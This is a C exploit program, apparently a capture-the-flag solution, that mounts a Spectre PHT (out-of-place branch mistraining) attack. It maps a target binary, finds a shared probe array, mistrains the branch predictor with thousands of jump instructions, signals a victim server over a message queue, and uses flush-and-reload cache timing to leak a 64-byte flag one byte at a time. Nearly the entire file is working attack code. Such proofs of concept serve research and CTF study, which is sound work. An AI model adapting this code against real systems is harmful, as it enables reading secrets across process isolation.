#include <stdio.h>
#include <fcntl.h>           /* For O_* constants */
#include <sys/stat.h>        /* For mode constants */
#include <time.h>
#include <mqueue.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <x86intrin.h>

#define SERVER "/lotto"

//#define CACHE_HIT_THRESHOLD 85
#define CACHE_HIT_THRESHOLD 100

//https://github.com/IAIK/transientfail/blob/master/pocs/spectre/PHT/sa_oop/main.c
//https://www.virsec.com/blog/20-spectre-and-meltdown-attacks-demonstrated-so-far-and-rising-this-class-of-threat-continues-in-2019
//https://arxiv.org/pdf/1811.05441.pdf

/* Spectre PHT */


typedef struct {
	size_t i;
} lotto_msg;

__attribute__((constructor)) void ignore_me() {
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
}

void pseudo_sleep(int it)
{
    for (volatile int i = 0; i < it; i++){}
}

uint64_t probe(uint8_t* addr)
{
    volatile uint64_t t;
    asm __volatile__(
            " .intel_syntax noprefix;"
            " mfence;"
            " rdtsc;"
            " mov esi, eax;"
            " mov eax, [%1];"
            " mfence;"
            " rdtsc;"
            // %0 == eax
            " sub eax, esi;"
            " .att_syntax;"

            : "=a" (t)
            : "c" (addr)
            : "esi");

    return t; 
}

void flush(uint8_t* addr)
{
    asm __volatile__ (
            " mfence;"
            " clflush 0(%0);"
            " mfence;"
            :
            : "c" (addr)
            :);
}

volatile int true = 1;

#define JE asm volatile("je end");
#define JE_16 JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE JE
#define JE_256 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16 JE_16
#define JE_4K JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256 JE_256
#define JE_64K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K JE_4K

void oop() {
	if (!true) true++;
	JE_64K

end:
	return;
}

static uint64_t min = CACHE_HIT_THRESHOLD;

uint8_t find_char(size_t idx, mqd_t* server, uint8_t* arr, uint8_t* zero_var)
{
    register uint64_t t;
    register uint64_t t1, t2;
    volatile uint8_t* addr;
    int i, j, k, mix_i, runs, junk = 0;
    static int times[0x100];

    for (i = 0; i < 0x100; i++) {
        times[i] = 0;
    }
    for (runs = 0; runs < 0x1000; runs++) {
        for (i = 0; i < 256; i++) {
            flush(&arr[i * 4096]);
        };

		for (i = 0; i < 0x40; i++) {
			oop();
		}

        lotto_msg msg = {0};
        msg.i = idx;

        mq_send(*server, (const char*)&msg, sizeof(msg), 0);

         // make speculative execution more likely
        flush(zero_var);

        pseudo_sleep(10000);
    
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &arr[mix_i * 4096];
            t = probe(addr);
            
            /*
            if (t < min) {
                min = t;
            }
            printf("Min Time %lu \n", min);
            */
            

            if (t < min + (min / 3)) {
                times[mix_i]++;
            }

            if (t < min) {
                min = t;
            } 
        }

        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || times[i] >= times[j]) {
                k = j;
                j = i;
            }
            else if (k < 0 || times[i] >= times[k]) {
                k = i;
            }
        }

        if (times[j] >= (2 * times[k] + 5) ||
            (times[j] == 2 && times[k] == 0)) {
                break;
            }
    }
    return (uint8_t)j;
}

int main(void)
{
    mqd_t qd_server;
    int msqid;
    int ret;

    int fd = open("./lottery", O_RDONLY);
    if (fd < 0) {
        printf("fopen failed \n");
        return -1;
    }

    struct stat st;
    fstat(fd, &st);

    void* target = mmap(NULL, st.st_size, PROT_READ, MAP_SHARED, fd, 0);

    if (target == MAP_FAILED) {
        printf("mmap failed \n");
        return -1;
    }

    uint8_t* lotto_arr = NULL;
    uint8_t* zero_var = NULL;
    for (int i = 0; i < st.st_size; i += 4) {
        uint32_t val = *(uint32_t*)(target + i);

        if (val == 0x99999997) {
            zero_var = (uint8_t *)target + i;
            lotto_arr = (uint8_t *)target + i - 256 * 4096;
        }
    }

    if (lotto_arr == NULL || zero_var == NULL) {
        printf("Couldnt find vars \n");
        return -1;
    }

    for (int i = 0; i < 4096 * 256; i++) {
        volatile uint8_t tmp = lotto_arr[i];
    }

    qd_server = mq_open(SERVER, O_WRONLY);

    if (qd_server == (mqd_t)-1) {
        printf("mq_open failed \n");
        return -1;
    }

    char flag[0x40] = {0};
    uint8_t res;

    for (int i = 0; i < 0x40; i++) {
        res = find_char(i, &qd_server, lotto_arr, zero_var);

        if (i % 2 == 0 && i > 0) {
            printf("Flag: %s \n", flag);
        }

        flag[i] = (char)res;
    }

    printf("Flag: %s \n", flag);
}